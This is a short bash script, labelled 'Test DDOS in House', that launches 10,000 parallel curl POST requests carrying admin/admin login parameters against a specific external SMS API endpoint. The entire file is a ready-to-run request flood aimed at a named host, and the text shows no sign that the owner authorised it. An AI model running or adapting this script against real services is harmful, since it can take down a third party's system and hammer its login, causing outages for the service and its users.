#!/bin/bash


echo Test DDOS in House

for i in {1..10000}
do
   curl -X POST --data 'msgType=auth&username=admin&password=admin&set_user_lang=ESP' https://sms.directo.alarislabs.com/api2/ &
done
